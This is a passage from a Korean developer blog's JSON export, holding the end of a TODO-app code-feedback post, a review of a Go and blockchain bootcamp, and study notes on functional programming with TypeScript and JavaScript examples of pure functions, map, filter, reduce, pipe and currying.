같다.  \n백엔드는 보통 저런 비슷하게 했는데 프론트는 일단 그냥 무지성 호출?\n\n또는 타입 대신 사용하는 용도로만... 상당히 저수준 형태로만 사용한 것 같아 반성의 시간이 들었다.\n\n<br>\n\n## 1-4 사전 과제 피드백 : TODO 앱 개선\n\n여기에서 다뤘던 참조 깃허브는 좀 충격적이었다.  \n내가 얼마나 저수준으로 코드를 작성했는지 반성하는 자아성찰의 시간을 가졌다.\n\n진짜 이제 좀 뭐 할수 있겠구나 싶었는데...  \n내가 짠 코드를 보고 어휴...\n\n![](/img03.gif)\n\n어지럽더라...\n\n<br>\n\n### Feedback 1) 맥락을 이해하기 힘든 변수명\n\n그리고 변수명...  \n나 또한 일전에 다른 교육에서 변수명 함수명 때문에 지적을 받았는데...\n\n우수갯 말로...(말은 아니지만)  \n이런 짤도 있다.\n\n![](/img04.png)\n\n오죽하면 [이런 서비스](https://www.curioustore.com/)도 있다.\n\n그래서 이런 부분을 다뤘다.  \n다른 몇 분의 코드와 함께...\n\nPS : 이건 여담인데 혹시 나와 같은 코드 스타일을 쓰시는 분이 있는지...  \n이건 나중에 디스코드에도 물어볼 예정이지만...\n\n```typescript\nfunction getData4User() {....}\nfunction getPage4Data2User() {....}\n```\n\n이렇게 난 숫자를 통해 for->4 to->2 를 사용하는데 이것에 대한 다른 분들의 의견도 들어보고 싶다.\n\n<br>\n\n### Feedback 2) 명령형 프로그래밍\n\n명령형(How)는 이름만 들어도 일일히 명령을 내려야 할 것 같은 뉘앙스가 든다.  \n그러나 선언형(What)은 목적과 목표만 정하기에 훨씬 간결하다.\n\nReact와 Vanilla Javascript 예시와 GraphQL, YAML등이 선언형임을 알려줬다.\n\n여기서 설명하다가 **Suspense Component**개념이 나왔는데 난 이 부분에 대해 처음 들어봤다. (그만큼 이론 지식이나 경험이 부족...)\n\n몇 가지 예시는 생각해보며 내 케이스와 비교해봤다.\n\n<br>\n\n### Feedback 3) 적절히 추상화 되지 않은 함수와 컴포넌트\n\n여기는 코드의 관리 부분이었다.\n\n공통된 로직을 뽑아서 관리 포인트를 줄이자 라는 것이 목표이다.\n\n즉 아래와 같이...\n\n```typescript\n// 적용 전 - 1) 수정하는 사용자, 2) 등록하는 사용자가 하나의 함수를 사용한다\nconst getInitialData = (type: 'edit' | 'register') => {\n  if (type ==== 'edit') {\n    // 수정 시에 필요한 초기 데이터를 불러오는 로직\n  } else {\n    // 등록 시에 필요한 초기 데이터를 불러오는 로직\n  }\n};\n```\n\n이런 코드가 함수 내에 있다면 이것을 뜯어서...\n\n```typescript\n// 적용 후 - 1) 수정하는 사용자, 2) 등록하는 사용자가 서로 다른 함수를 사용한다\nconst getInitialDataForEdit = () => {\n  // 수정 시에 필요한 초기 데이터를 불러오는 로직\n}\nconst getInitialDataForRegister = () => {\n  // 등록 시에 필요한 초기 데이터를 불러오는 로직\n}\n```\n\n이렇게 각 함수로 나눠서 처리하는게 좋다.  \n그리고 우발적 중복은 피하되, 의도한 중복은 핸들링이 어느정도 되지만 가급적 줄이는 것이 좋은 것 같다.\n\n예시 코드가 몇 있었는데 다행히 나는 그렇게 짜진 않았다.  \n하지만 유사한 부분도 있었기에 좀 바꿔야 할 듯 싶다.\n\n<br>\n\n## 1-5 과제 설명\n\n사전 과제를 기반으로 오늘 설명한 것을 중점적으로 적용을 해보라 하셨다.  \n근데...\n\n아직 못했다...  \n이 부분은 어제까지였는데, 한번 주말에 다시 해볼 예정이다.\n\n나의 경우 typescript를 쓰는거라서 아래의 조건을 클리어하는게 목표다.\n\n- **타입스크립트를 써본 경우**\n  1. tsconfig에 strict 옵션 적용\n  2. 타입 가드 및 타입 추론을 사용해 any, 타입 단언을 모두 없애기\n  3. 반복되는 타입은 제네릭, 타입 상속 / 합성 등으로 추상화\n  4. 보다 좁은 타입으로 정의 (ex. string → as const or union)\n\n1번과 2번은 원래 적용했고,  \n3번과 4번은 일부 적용했다.\n\n근데 이것보다 다른 사람들이 짠 코드를 보니 내가 좀 엉망으로 짰구나 라고 생각이 들어 전반적으로 바꿔볼 생각이다.  \n그리고 같이 듣는 백엔드 Nest.JS를 이용해서 한번 To-Do 앱을 짜볼 예정이다.\n\n함수형 프로그래밍을 적용해보고 둘 간의 사용자 인증 및 화면단 구성 등등...  \n한번 개인 포트폴리오 겸 만들어봐야겠다.\n\n<br>\n\n## 정리\n\n참 유익했던 것 같다.  \n강의는 사실 길지 않지만...\n\n거기서 나오는 내용은 너무나도 방대했다. (나에게는?)  \n나오는 내용은 나에게 있어서 매우 유익했다.\n\n잘 배워서 내 것으로 다 흡수해야겠다.  \n오늘도 강의가 있는데 잘 들어보고 더 나은 실력을 갖춰서,\n\n내가 만드는 서비스에도 적용해보고,  \n다른 곳에 들어갈 수 있는 실력도 갖춰봐야겠다.\n\n```toc\n\n```\n"},{"excerpt":"블록체인 강의 후기? 아직 강의가 안끝났지만... 강의 일정은 1월 20일까지지만... 아마 자체 종료를 하지 않을까 싶어 이제 가볍게 후기글? 처럼 남긴다. 이 글은 개인적 후기이며, 다른 참가자 분은 다르게 느끼실 수도 있습니다. \n약간의 비판적인 글은 있지만 비난할 의도가 아닌 개선했으면 하는 점이라는 것을 밝힙니다.  어떻게? 아는 지인이 공식 홈…","fields":{"slug":"/my_story/230111_codesta_wemade_block_review./"},"frontmatter":{"date":"January 11, 2023","title":"22년 코드스테이츠 위메이드 블록체인 후기","description":null,"tags":["My Story"],"series":"My Story","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n# 블록체인 강의 후기?\n\n아직 강의가 안끝났지만...  \n강의 일정은 1월 20일까지지만...\n\n아마 자체 종료를 하지 않을까 싶어 이제 가볍게 후기글? 처럼 남긴다.\n\n<font color=\"red\">이 글은 개인적 후기이며, 다른 참가자 분은 다르게 느끼실 수도 있습니다.</font> <br>\n<font color=\"red\">약간의 비판적인 글은 있지만 비난할 의도가 아닌 개선했으면 하는 점이라는 것을 밝힙니다.</font> <br>\n\n<br>\n\n## 어떻게?\n\n아는 지인이 [공식 홈페이지](https://codestates-wemade.oopy.io)에 있는 것을 공유해주면서 알게 되었다.  \n사실 블록체인에 관심은 있었는데 막 찾아보는 수준은 아니었고... 그냥 배워보고 싶다는 생각만 들었다.\n\n그래서 지원서를 냈는데...사실 될 줄은 몰랐다 -\\_-;;  \n마지막 인성검사 같은 지원 문서에서 똑같은 질문에 약간 다른 답을 내봤었다.\n\n근데...되었다 -\\_-;;\n\n![](/img01.png)\n\n교육과정은 Go언어로 백엔드 구축하고, 그 다음은 블록체인 교육이었다.  \n**이건 여담인데 난 블록체인은 아니고 Go 백엔드만 진행하는 줄 알았다 -\\_-;;**\n\n즉 Go백엔드랑 블록체인이랑 나눠져 있고, Go백엔드 수업하고 끝나는 줄 알았다...  \n책을 잘 읽는데 왜 공지는 제대로 읽지 못한 것인가...\n\n무튼 그렇게 시작되었다.\n\n<br>\n\n## Go언어는 어때?\n\n음...  \n개인적으론...외주 개발처럼 돈주면 배워서 개발하겠는데 글쎄...\n\n나랑은 핏이 안맞는 언어?  \n그렇게 변태같다는 **Objective-C**도 난 좋았다. (물론 처음에 좀 난해했지만...)\n\n근데 Go언어는 뭔가 처음해봐서 이질적인 문제인가... 싶기도 하고...  \n굳이 찾아서 쓰진 않을거 같았다.  \n(그냥 Typescript & Nest.Js 만세)\n\n물론 개발업 접고 전업 투자하다가 이제 다시 개발업으로 발을 담구려 하는 중인데, 옛날에 배웠던것이...  \n**개발자는 언어는 여러개를 배워보면 좋다.** 이다.\n\n왜냐하면 각 언어의 장단점이나 언어가 표현하는 방식 등을 통해 인사이트를 넓힐 수 있기에..  \n무튼... Go언어는 배워두면 좋긴 한거 같다.\n\n그래서 이 부분은 배운 것을 정리한 내 노션에서 한번 이곳으로 다시 포스팅 할 예정이다.\n\n<br>\n\n## Go 백엔드 파이널 프로젝트?\n\n음...개인적으로 여기서 할말 정말 많은데 웹상에서 괜히 안좋은 말 많이 해봤자 좋을 것도 없고...  \n내가 다른 사람보다 시간 투자를 덜 한것도 있고, 관심이 많이 없었다.\n\n그리고 무엇보다 연말에..**(심지어 12.21~ 25)**에 진행하는 무자비함 ㅋㅋㅋ  \n물론 다른 분들은 여기에 열정이 있어서 열심히 하신 듯 하다.\n\n나만 못했던 듯 하다.  \n저녁 22일인가 그 때 빼고 올 약속이어서 뭐 제대로 못했다.  \n실제 개발한건 한 10시간 되려나?\n\n다른 분들 깃허브 보니... 정말 뜨겁게들 하셨다....  \n나만 논거 같다 -\\_-;;\n\n그래서 결국 뭐..\n\n![](/img02.png)\n\n**멋지게 말아먹었다**\n\n사실 문서화랑 로그 출력은 개발했는데 그 제출 기한 이후에 잠깐 짬내서 했고, 메뉴 등록, 주문 상태랑 평점 리뷰 기능은 구현은 되었는데 미흡한게 있었다.  \n저기 위에 백엔드 개발자 2년차가 내 리뷰어인데 위메이드 소속인지...코드스테이츠 소속인지... 아님 외주인지..(개인적으론 외주인듯?)\n\n내가 설정이랑 메뉴출력은 개발은 했는데 기대치 미달로 박았다. ㅋㅋㅋㅋ  \n처음에 보고 하도 어이가 없어서 이의제기 할까 말까 고민했다.\n\n근데 난 당하고는 못산다 ㅎㅎ  \n물리적으로 맞으면? 바로 상대방 귀싸대기 날리고, 법으로 귀찮게 한다? 증거 모아서 맞고소 가는 사람이다.\n\n![](/img03.png)\n\n그래서 노션에 따로 페이지 파서 공유 후 진행자 측의 문의를 남겼다.\n그리고 평가는 정정해줬다.\n\n사실 위에서 언급한 등록 상태 평점 리뷰 가능도 말할까 하다가 일일히 또 귀찮게 적고 뭐 하고 시시비비 가리는 것도 귀찮고...  \n**내가 리뷰어 분을 무시하는건 절대 아님을 밝힌다.**  \n혹시 보실 수 도 있겠지만...(안볼 확률이 크지만...)\n\n> 귀하? 이럼 좀 너무 딱딱하니...선생님 덕분에 한 수 배웠습니다.  \n> 명명법은 뭐 개인 플젝할 때만 쓰고 같이 협업에서는 다른 사람과 컨벤션을 맞춰서 해볼께요 ㅎㅎ  \n> 추천하신 책도 좀 읽어보겠습니다.\n\n혹시나 기분 나쁠까봐 전달한 페이지에도 아래와 같은 글을 남기긴 했었다.\n\n![](/img04.png)\n\n원래 항상 토론이나 정정을 할 때는 정중하게 먼저 물어보고 자세를 취하는게 좋은 행동이다.\n\n<br>\n\n## 블록체인은?\n\n음...  \n솔직히 말하면 난 블록체인 하기 전에는 재미있을 줄 알았는데...\n\n알아야 할 이론도 많고, 너무 복잡하고...  \n약간 AI 공부하는 느낌?\n\n나도 이 글을 쓰는 시점에 블록체인 기술에 관심은 많다.  \n근데 아직 받아들일 때가 아닌것 같다.\n\n사실 여기서 준 자료가 좋은 것은 알겠으나 아직 이것을 내가 흡수할 준비가 안되었다랄까?  \n그래서 난 Out 준비를 했다.\n\n그리고...난 블록체인 기술은 계속 키워야 한다고 생각하지만 코인은 정말 강력한 규제를 해야 한다고 생각하는 사람이다.  \n이 부분은 여기서 다루지 않겠다.  \n이거는 기술적인 논제가 아니기 때문에...\n\n<br>\n\n## 교육 방식은 어떤식으로?\n\n내가 여기 주최측의 노션 화면을 공유하거나 자료를 오픈할 수 없기에 글로 남긴다.  \n노션도 주최측의 중요한 자산이고 저작권이 있기 때문에 내가 여기 자료를 함부로 올릴 수 없다.\n\n그래서 서술로만 쓰는 점을 양해해 주시길...\n\n일단 노션으로 자료나 일정 그리고 기타 소통을 공유한다.  \n근데 노션이 너무 끊기고(내 컴이 구려서 그른가...) 자꾸 페이지 리로딩이나 글을 읽을 때 막히거나 링크가 깨지는 문제(이건 주최측 설정 문제)가 가끔 있었다.\n\n그래서 그냥 웹 서비스로 있었으면 어땠을까 싶었지만...  \n내가 하나 깨달은게 노션으로 하면 자료 복사가 좀 힘들다랄까?  \n할 수는 있는데 일일히 다 따서 해야 해서...\n\n무튼 복사를 좀 막을 수 있는 장점이 있다?  \n아니 모르겠다 ㅋㅋㅋ 노션은 좀 별로인듯... 개인 자료 정리엔 최고지만...\n\n그냥 사견이다.  \n나중에 일할 회사에서 노션 쓰면 잘 써야지... ㅎㅎ..\n\n그리고 정해진 시간에 온라인 **줌(Zoom)**으로 강의를 한다.\n\n그외 소통은 **디스코드**를 이용했다.  \n당연한 이야기겠지만 인가된 인원만 들어와서 쓸 수 있게끔 했다.\n\n그리고 Go 강의에서는 매일 과제가 나갔고, 학습해서 풀 수 있는 가벼운 수준이었다.\n\n또한 블록체인과 Go 둘다 교육자료를 주고 스스로 배우는 형식인데, 이것을 배우고 스스로 정리하여,  \nTIL? 데일리 셀프 체크라는 것을 일일히 하루에 한번 작성을 해야 한다.\n\n마치 군대 **수양록** 처럼?(수양록 아는 사람 있으려나 ㅋ)  \n개인적으로 넘 귀찮았고... 블록체인에서는 이론 나올 때 비판적인 글을 좀 적었다.  \n위메이드 사태도 좀 비판적인?\n\n그래도 난 블록체인 기술은 좋다고 생각한다.  \n단지 코인이나 한탕 해먹으려는 놈들이 나쁜 놈들이지...\n\n<br>\n\n## 강사님들은?\n\n강사님들은 대체로 좋았다.  \n특히 코드스테이츠 블록체인 강사님들의 다양한 경험이 신기했고, 창업 후 실패 라는 경험을 통해 또 열심히 도전했던...\n\n그런 삶이 멋있었다.\n\n나도 창업을 현재 고려중인데... 일단 다른 누군가와 함께 일해보고 싶다 요새는 ㅎㅎ  \n그리고 목소리가 성우 하셔도 될 듯한 분도 계셨고...\n\n다들 특색 있으셨다 ㅎㅎ\n\n그리고 어느 한 강사님은 자꾸 위메이드 가야한다 한다 하셔서 ㅎㅎㅎ\n\n**이거 여기서 취업 조건이 맞는 사람이 많아야 자기 커미션이 떨어지나?** 라는 생각이 들 정도로?  \n아니면 강사님이 위메이드 가시려고 하시는건가...ㅋㅋ\n\n강사님들도 좋았다.\n\n<br>\n\n## 페어 프로그래밍 과정\n\n사실 Go 할때는 없었고, 블록체인 할 때만 있었는데, 난 이거 실효성을 모르겠다.  \n굳이?\n\n뭔가 열심히 하는 사람들에겐 좋은 기회였겠지만...  \n실제 코딩이라면 난 찬성이다.\n\n근데 이론에서 페어 프로그래밍이라..  \n그냥 페어 프로그래밍이 아니라 팀을 이뤄 집단 지성으로 작은 학습 노트를 만들어보는 그런 시간으로 했으면 어땠을까 싶다.  \n물론 주최 측에서는 그렇게 제안을 하기도 했다.\n\n하지만 뭔가 체계를 잡고 준게 아니라 이렇게 하면 어떠한지 라는 선택적 뉘앙스를 풍기기에 어떻게 해야 할지 잘 몰랐다.\n\n물론 이게 백엔드나 프론트 과정이었으면 내가 열심히 자료 조사도 하고 더 했을 듯...\n이건 그냥 관심의 차이 인것 같다.\n\n그리고 개인적으론 이 부분은 좀 개선할 필요가 있지 않을까 싶다.  \n뭔가 틀을 좀 잡고 명확하게 어떤 결과물을 도출하세요 와 같은 가이드 해주는?\n\n물론 개인 사견이다.\n\n<br>\n\n## 취업 연계라던데?\n\n음 이건 뭐...  \n사실 난 취업 목적보다는 교육 수강에 무게를 둔 사람이라 관심이 없었지만...\n\n나 빼고 다들 위메이드에 들어가려고 노력 많이 하신듯 하다.  \n근데 뭐 다 뽑으면 이렇게 많은 인원을 모집하지 않았겠지...\n\n몇명 뽑는다 이야기는 안했는데 뉘앙스를 너무 흘려서...상위 몇명 추려가지 않을까 싶다.  \n그래서 소위 세상이 좋아하는 경쟁 시스템~\n\n<br>\n\n## 그래서 어땠음?\n\n뭐 좋았다.  \n덕분에 Go언어도 경험해보고, Gin 프레임워크도 써보고...\n블록체인도 살짝 맛보고 가고...\n\n물론 파이널 프로젝트를 진행할지 말지 아직 고민중 이긴 한데..  \n사실 난 프론트 개발 있으면 하고, 없으면 하차 하려고 한다.\n\n근데 오늘도 라이브에서 UI 개발 없다고 해서 그냥 내일 강의까지만 듣고 나올 생각이다.  \n왜냐하면 파이널 프로젝트를 들어봤는데 너무 어렵다. (내 기준)\n\n그리고 시간이 많이 들거 같은데, 지금 내가 만드는 서비스랑 원티드 백엔드 프론트엔드 꺼까지 하면서 할 수가 없을 듯 싶다.(일단 리엑트랑 Next.Js, Nest.JS가 너무 재미있다!)  \n그래서 내일까지 듣고 하차를 하지 않을까 싶다.\n\n사설이 길었다.  \n총평?\n\n- 블록체인에 관심 많은 분이라면 정말 좋은 교육!\n- 블록체인 현업에 있으면서 오면 더욱 좋음!!\n- 단 일반 직장인은 따라오기 좀 버거운 내용이나 진행방식이 있음\n- 라이브 세션에는 항상 웹캠을 켜야 함...(이거 좀 개인적으로 불편했음)\n- 매일 진행되는 숙제와 TIL 일기장을 써야할 것\n\n이상!  \n후기를 마친다.\n\n이후에는 내가 여기서 배운걸 한번 정리하는 그런 포스팅도 준비해 볼 예정이다.\n\n```toc\n\n```\n"},{"excerpt":"thumbnail 백엔드 수업 1일차 학습 나는 이번에 프론트랑 같이 수강을 했는데 정말 어지러웠다. 난이도가 높은게 아니라 옆에는 프론트 띄우고, 옆에는 백엔드 띄우니 두 강의 내용을 쫒는거 자체가 불가능할 정도였다. 그래도 다행히 프론트 쪽은 아이스 브레이킹을 하느라 주요한 내용은 안나왔고, 백엔드 쪽을 약간 집중해서 들었다. 여기 TIL은 내가 들으…","fields":{"slug":"/til/230111_wanted_preon_back01/"},"frontmatter":{"date":"January 11, 2023","title":"23년 1월 원티드 프리온보딩 백엔드 1일차 TIL (함수형 프로그래밍, 순수함수) (Wanted Pre Onboarding BackEnd)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](/img01.png)\n\n# 백엔드 수업 1일차 학습\n\n나는 이번에 프론트랑 같이 수강을 했는데 정말 어지러웠다.  \n난이도가 높은게 아니라 옆에는 프론트 띄우고, 옆에는 백엔드 띄우니 두 강의 내용을 쫒는거 자체가 불가능할 정도였다.\n\n그래도 다행히 프론트 쪽은 아이스 브레이킹을 하느라 주요한 내용은 안나왔고, 백엔드 쪽을 약간 집중해서 들었다.  \n여기 TIL은 내가 들으면서 배우거나 학습한 내용을 정리하는 위주로 올릴 예정이다.\n\n개인 학습 내용을 정리한 것이라 약간 부실할 수도 있다.\n\n<font color=\"red\">강의 자료는 강사님의 것이라 공유는 불가능하고, 혹시 저작권 침해나 외부 노출 불가 자료가 있다면 알려주시면 바로 수정 반영 처리하겠습니다.</font> <br>\n<font color=\"red\">오픈된 깃허브의 경우 웹에서 누구나 접근이 가능하기에 깃허브는 공개하였습니다. </font>\n\n<br>\n\n### [2일차 강의는 이곳 포스팅 참조](https://elfinlas.github.io/til/230114_wanted_preon_back02)\n\n<br>\n\n## 금일 진행 내용\n\n- 함수형 프로그래밍 컨셉에 대하여\n- 객체지향, 함수형 프로그래밍 패러다임\n- 실용주의 프로그래밍\n- Live Coding1 : 고차함수(map, filter, reduce) 구현\n\n<br>\n\n### 함수형 프로그래밍 설명 및 간단 이론\n\n- 함수에 대해 설명하고, 함수형 프로그래밍에 대해 간략한 설명\n\n<br>\n\n#### 함수에 대해\n\n함수는 하나의 기능을 가지고 언제나 동일한 결과를 내야 한다.  \n함수 내에서 액션으로 인해 사이드 이팩트가 나는 것을 줄여야 한다. (종점은 Side Effect 제거)\n\n<br>\n\n#### 순수 함수\n\n부수효과 없이 결과값이 인자에만 의존하는 함수를 **순수함수**라 한다.\n**부수효과**는 함수에서 결괏값을 주는 것 외에 하는 행동. (Side Effect)\n\n<br>\n\n#### 함수형 프로그래밍 예 (맛보기)\n\n```typescript\n//Bad case\nconst init: number = 0\n\nconst add = (number: number) => {\n  return number + init\n}\n\nadd(5)\n```\n\n위 코드는 외부의 **init**이라는 값에 의해 함수 밖에 있는 값에 의해 함수 값이 결정되기에 잘못된 예라 볼 수 있다.  \n그럼 위와 같은 코드를 순수함수 형태로 바꾸려면 아래와 같이 바꿀 수 있다.\n\n```typescript\n//Good case\nconst init: number = 0\n\nconst add = (number: number, init: number = 0) => {\n  return number + init\n}\n\nadd(5)\n```\n\n외부에 있던 init이라는 변수를 전달인자로 바꾸고, 해당 값을 0으로 기본 값을 주는 방법으로 바꾸면 순수함수 형태로 바꿀 수 있다.\n\n또 다른 예제를 보자\n\n```typescript\n//Bad Case\nconst fruits: string[] = ['Apple', 'Orange', 'Blueberry']\n\nconst head = (arr: string[]) => {\n  return arr.shift()\n}\n\nconsole.log(head(fruits))\n```\n\n여기서 **shift** 함수는 전달된 배열의 첫 요소를 반환하고, 나머지는 제거한다.  \n이렇게 하면 전달된 배열의 경우 조작이 일어나게 된다.\n\n함수는 **액션(무언가 데이터를 조작,삭제 등을 하는 행위)**이 일어나는 것을 줄이고 없애야 한다.  \n그럼 이것을 개선 한다면?\n\n```typescript\n//Good Case\nconst fruits: string[] = ['Apple', 'Orange', 'Blueberry']\n\nconst head = (arr: string[]) => {\n  return arr.length < 1 ? undefined : arr[0]\n}\n\nconsole.log(head(fruits))\n```\n\n위와 같이 한다면 전달된 배열을 조작하지 않고 순수하게 값만 넘기는 형태로 구현이 된다.\n\n또 예제가 있다.\n\n```typescript\n//Bad Case\nconst fruits: string[] = ['Apple', 'Orange', 'Blueberry']\nfruits[2] = 'Tomato'\n```\n\n이렇게 대입을 할 경우 **원본 데이터**에 대한 **변경**이 일어나게 된다.  \n함수형 페러다임에서는 원본을 복사해서 사용해야 한다.\n\n그래서 아래와 같이 **고차함수**인 map을 이용해 새로운 배열을 만들어 낸다.\n\n```typescript\n//Good Case\nconst fruits: string[] = ['Apple', 'Orange', 'Blueberry']\n\nconst newFruits = fruits.map((fruit: string) =>\n  fruit === 'Blueberry' ? 'Tomato' : fruit\n)\n\nconsole.log('newFruites = ', newFruits)\n```\n\n<br>\n\n### 객체지향과 함수형 프로그래밍\n\n둘의 개념 중 상반되는 개념은 없다.\n\n#### 객체지향(OOP)\n\n- 일반적인 방법으로 모듈화\n- 다형성\n- 현실 세계를 모델링\n\n#### 함수형 (FP)\n\n- 일반적인 방법으로 모듈화\n- 인풋과 아웃풋에만 의존\n- 수학의 관점으로 사고하기\n\n<br>\n\n### 함수형 프로그래밍 패러다임 (키워드)\n\n- No Side Effects\n  - Pure Function\n  - No Mutation\n- Higher Order Function\n  - Function is value\n\n<br>\n\n---\n\n**잠시 휴식 후 Live Coding**\n\n<br>\n\n### Live Coding (고차함수 구현)\n\n[수업 예제 Github](https://github.com/Jun4928/wanted-pre-onboarding-challenge-BE-task-JAN.2023)\n\n먼저 간단한 예제부터 시작한다.\n\n<br>\n\n#### 일반적인 예제\n\n```typescript\nconst arr: number[] = [1, 2, 3, 4, 5]\n\n// 1. 홀수만 걸러주세요\n// 2. 걸러진 원소에 곱하기 2를 해주세요\n// 3. 모두 다 더해주세요\n\nlet sum = 0\nfor (const el of arr) {\n  if (el % 2 === 1) {\n    const newElement = el * 2\n    sum += newElement\n  }\n}\n```\n\n위 코드는 일반적인 방법으로 구현한 것이고, 아래는 고차함수를 이용해 구현한 것이다.\n\n```javascript\nconst sum2 = arr\n  .filter(el => el % 2 === 1)\n  .map(el => el * 2)\n  .reduce((prev, curr) => prev + curr)\n```\n\n<br>\n\n#### 고차함수 Map 구현\n\n이제 고차함수 중 **map**을 직접 구현한 코드\n\n```javascript\n/**\n * map: 배열을 순회하면서 func 을 적용해서 새로운 결과 값을 담은 배열을 리턴한다.\n * func: (el) => value\n */\nconst map = (func, iter) => {\n  const result = []\n\n  for (const el of iter) {\n    result.push(func(el))\n  }\n\n  return result\n}\nconsole.log(map(el => el * 2, arr))\n```\n\n<br>\n\n#### 고차함수 Filter 구현\n\n```javascript\n/**\n *  filter: 배열을 순회하면서 func 의 truthy 값(조건에 맞는 값)만 배열에 담아 리턴한다.\n *  func: (el) => truthy | falsy\n */\nconst filter = (func, iter) => {\n  const result = []\n\n  for (const el of iter) {\n    if (func(el)) {\n      result.push(el)\n    }\n  }\n\n  return result\n}\n\nconsole.log(filter(el => el % 2 === 1, arr))\n```\n\n<br>\n\n#### 고차함수 Reduce 구현\n\n```javascript\n/**\n * reduce: 배열을 순회면서 func 을 반복 적용해서 새로운 결과 값을 얻어낸다. (쪼개는 함수)\n * func: (acc, el) => acc\n * func: (prev, curr) => acc\n */\n\nconst reduce = (func, acc, iter) => {\n  if (iter === undefined) {\n    iter = acc[Symbol.iterator]()\n    acc = iter.next().value\n  }\n\n  for (const el of iter) {\n    acc = func(acc, el)\n  }\n\n  return acc\n}\n\nconsole.log(reduce((prev, curr) => prev + curr, 0, arr))\nconsole.log(reduce((prev, curr) => prev + curr, arr))\n```\n\n<br>\n\n### Live Coding (함수의 연결)\n\n```javascript\n/**\n * 함수의 합성, pipe\n * 순회 가능한 객체를 받아서 함수의 파이프라인을 타고 최종 결과값을 리턴한다.\n */\nconst pipe = (iter, ...functions) =>\n  reduce((prev, func) => func(prev), iter, functions)\n\nconst arr = [1, 2, 3, 4, 5]\n\nconst sum2 = arr\n  .filter(el => el % 2 === 1)\n  .map(el => el * 2)\n  .reduce((prev, curr) => prev + curr)\n\nconsole.log(sum2)\n\npipe(\n  arr,\n  arr => filter(el => el % 2 === 1, arr),\n  arr => map(el => el * 2, arr),\n  arr => reduce((prev, curr) => prev + curr, arr),\n  result => console.log(result)\n)\n```\n\n우리가 구현된 고차함수를 쓸 때 **.**으로 체이닝 하듯이 쓰는 것을 구현\n\n<br>\n\n### Live Coding (커링과 지연함수)\n\n난 커링을 잘 몰라서 이 부분은 [Javascript.Info](https://ko.javascript.info/currying-partials) 에서 많이 참고했다.  \n커링은 전달된 함수를 가지고 있다가, 다른 함수가 오면 같이 함수를 처리 반환하는 함수를 의미한다.(틀릴 수 있음 => 향후 포스팅 예정)\n\n```javascript\nconst curry = func => (a, ...args) =>\n  args.length > 0 ? func(a, ...args) : (...args) => func(a, ...args)\n```\n\n커링의 구현체는 위와 같다.\n\n이를 통해 각 고차함수를 커링으로 묶으면 아래와 같다.  \n단순하게 함수를 커링 전달인자로 넘긴다.\n\n```javascript\nconst map = curry((func, iter) => {\n  const result = []\n  for (const el of iter) {\n    result.push(func(el))\n  }\n\n  return result\n})\n\nconst filter = curry((func, iter) => {\n  const result = []\n  for (const el of iter) {\n    if (func(el)) {\n      result.push(el)\n    }\n  }\n\n  return result\n})\n\nconst reduce = curry((func, acc, iter) => {\n  if (iter === undefined) {\n    iter = acc[Symbol.iterator]()\n    acc = iter.next().value\n  }\n\n  for (const el of iter) {\n    acc = func(acc, el)\n  }\n\n  return acc\n})\n```\n\n<br>\n\n커링에 대해 잠깐 집고 넘어가면...\n아래는 커리를 쓰지 않은 버전\n\n```javascript\nconst arr = [1, 2, 3, 4, 5]\nconst noCurAdd = (a, b) => a + b\n\nconsole.log(noCurAdd(1, 3))\nconsole.log(noCurAdd(1)) //포인트 1\nconsole.log(noCurAdd(1)(3)) //에러 포인트\n\nconst curAdd = curry((a, b) => a + b)\nconsole.log(curAdd(1, 3))\nconsole.log(curAdd(1)) //포인트 2\nconsole.log(curAdd(1)(3))\n```\n\n위 결과를 실행하면 에러와 함께 아래의 것을 맞이할 것이다.\n\n```pl\n4\nNaN\n/Users/mhlab/Develop/study/Wanted/PreOnboard_Back/lecture/wanted-pre-onboarding-challenge-BE-task-JAN.2023/lecture-1/3.js:53\nconsole.log(noCurAdd(1)(3)); //에러 포인트\n                       ^\n\nTypeError: noCurAdd(...) is not a function\n    at Object.<anonymous> (/Users/mhlab/Develop/study/Wanted/PreOnboard_Back/lecture/wanted-pre-onboarding-challenge-BE-task-JAN.2023/lecture-1/3.js:53:24)\n    at Module._compile (node:internal/modules/cjs/loader:1155:14)\n    at Object.Module._extensions..js (node:internal/modules/cjs/loader:1209:10)\n    at Module.load (node:internal/modules/cjs/loader:1033:32)\n    at Function.Module._load (node:internal/modules/cjs/loader:868:12)\n    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)\n    at node:internal/main/run_main_module:22:47\n```\n\n보면 알겠지만 커리 미사용의 두 번째 **포인트1** 영역의 경우 NaN이 뜰 것이다.  \n당연한 것이 함수가 다음 전달인자가 없이 넘어 왔기에 숫자가 아님을 표시하는 **NaN**이 뜨는 것이고, 에러가 난다.\n\n아마 저 주석의 에러 포인트에서 에러가 날 것이다.\n이건 당연한게 전달인자를 받는 부분에서 **noCurAdd**함수의 전달인자를 벗어나 또 다른 값이 왔다.\n\n그러면 왜 커링을 적용한 것은 되는가?  \n커링의 구현체를 보면 알 수 있다.\n\n커링의 구현체에서 보면 아래와 같이 되어 있다.\n\n> func => (a, ...args) =>\n\n즉 전달인자가 스프레드 연산자(Spread Operator)를 통해 여려 인자를 받기에 뒤에 있는 값도 같은 전달인자라 판단한 것이다.\n\n하지만 **포인트2**의 경우 인자가 하나기에 아래와 같이 함수로 표현되어 나타나진다.\n\n```\n4\n[Function (anonymous)]\n4\n```\n\n그 외 첫번째는 바로 알 수 있고, 마지막은 그냥 전달인자라 보면 된다.\n\n> console.log(curAdd(1)(3)(5))\n\n위 코드는 당연히 에러가 난다.  \n왜냐하면 커리 안에 있는 함수의 인자를 벗어났기 때문이다.\n\n그 외에는 이것을 응용한 것을 소개하는 시간이었다.  \n이번 포스팅에서는 해당 내용을 따로 추가하진 않겠지만...  \n시간이 되면 업데이트 포스팅을 할 예정이다.\n\n<br>\n\n## 1일차 후기\n\n음...개인적으로 현업을 내려놓은지 약 2년? 3년 정도 된거 같은데 다시 한번 워밍업? 하는 시간이었다.  \n내가 최근에 만든, 그리고 만들고 있는 서비스 코드도 진짜 엉망인데...\n\n이번에 함수형을 배워서 좀 개선해 나가보고 싶다.  \n**코드스테이츠 블록체인 + 온보딩 백엔드 + 온보딩 프론트엔드 = 고통의 삼위일체**\n\n좀 빡센데...해보자.  \n힘들어야 성장하더라(?)\n\n<br>\n\n### [2일차 강의는 이곳 포스팅 참조](https://elfinlas.github.io/til/230114_wanted_preon_back02)\n\n<br>\n\n## 참고 